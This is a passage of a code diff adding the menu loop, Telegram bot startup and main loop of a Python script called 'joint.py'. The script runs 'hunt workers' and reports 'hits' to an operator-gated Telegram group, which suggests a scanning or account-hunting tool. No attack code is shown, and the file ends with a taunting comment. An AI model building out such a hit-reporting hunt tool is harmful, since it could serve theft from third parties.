+            run_live_jack_panel()
+            render_session_ready_menu()
+        elif choice in ("2", "status", "snap", "s"):
+            global DASHBOARD_SHOW_LOGO
+            DASHBOARD_SHOW_LOGO = True
+            draw_dashboard()
+            print(
+                apply_color(
+                    "\n  Snapshot shown — Enter for menu · l=logout · q=quit\n",
+                    ANSI_DIM,
+                )
+            )
+            try:
+                input(apply_color("    › ", ANSI_YELLOW))
+            except EOFError:
+                pass
+            print()
+            render_session_ready_menu()
+        elif choice in ("l", "logout", "out", "log out"):
+            if terminal_execute_logout():
+                return "logged_out"
+            render_session_ready_menu()
+        elif choice in ("q", "quit", "exit", "stop"):
+            shutdown_joint_session(via_menu=True)
+        else:
+            print(apply_color("  Unknown option — try 1, 2, l, or q", ANSI_YELLOW))
+
+
+def _telegram_startup_sequence():
+    """Welcome panel only when verified — terminal verify screen handles the rest."""
+    try:
+        reconcile_operator_hit_group()
+        sync_operator_access()
+        schedule_sync_telegram_commands(TELEGRAM_CHAT_ID)
+        if operator_access_ok(force=True):
+            mark_operator_access_verified()
+        hg_ok, _ = operator_hit_group_access_state(force=True)
+        if hg_ok:
+            send_startup_message()
+        else:
+            reply_hit_group_required()
+    except Exception as exc:
+        log_event("TG BOOT", str(exc)[:100])
+
+
+def _telegram_monitor_bootstrap():
+    """Poll is already live; only quick webhook clear + settings, then background startup."""
+    try:
+        ensure_telegram_polling_mode()
+        admin_load_settings()
+        if TELEGRAM_CHAT_ID:
+            schedule_sync_telegram_commands(TELEGRAM_CHAT_ID)
+        threading.Thread(target=_telegram_startup_sequence, daemon=True).start()
+    except Exception as exc:
+        log_event("TG BOOT", str(exc)[:100])
+
+
+def start_telegram_monitor():
+    global _telegram_monitor_started
+    if not TELEGRAM_ENABLED or _telegram_monitor_started:
+        return
+    _telegram_monitor_started = True
+    threading.Thread(target=poll_telegram_updates, daemon=True, name="tg-poll").start()
+    threading.Thread(target=live_watch_loop, daemon=True).start()
+    threading.Thread(target=access_sync_loop, daemon=True).start()
+    threading.Thread(target=_telegram_monitor_bootstrap, daemon=True).start()
+    start_hit_tg_retry_monitor()
+
+
+try:
+    configure_telegram()
+    start_health_monitor()
+    threading.Thread(target=_warmup_probes_once, daemon=True).start()
+    threading.Thread(target=profile_init_on_startup, daemon=True).start()
+    start_telegram_monitor()
+    apply_worker_pause_state(defer_access=True)
+
+    _session_exit = run_session_menu_loop()
+    if _session_exit == "logged_out":
+        print(apply_color("\n  ▸ Logged out — run python joint.py to link again.\n", ANSI_DIM))
+        sys.exit(0)
+
+    # Unreachable if menu returns normally — q calls shutdown_joint_session().
+    if not _workers_started:
+        start_hunt_workers()
+
+    print(
+        apply_color(
+            "\n  ▸ JACK hunt running · Ctrl+C to stop\n",
+            ANSI_GREEN,
+        )
+    )
+    try:
+        while True:
+            time.sleep(5)
+    except KeyboardInterrupt:
+        shutdown_joint_session()
+except KeyboardInterrupt:
+    shutdown_joint_session()
+
+
+# If this gives you goosebumps, you're already behind because you'll need more brains than courage to compete with me.
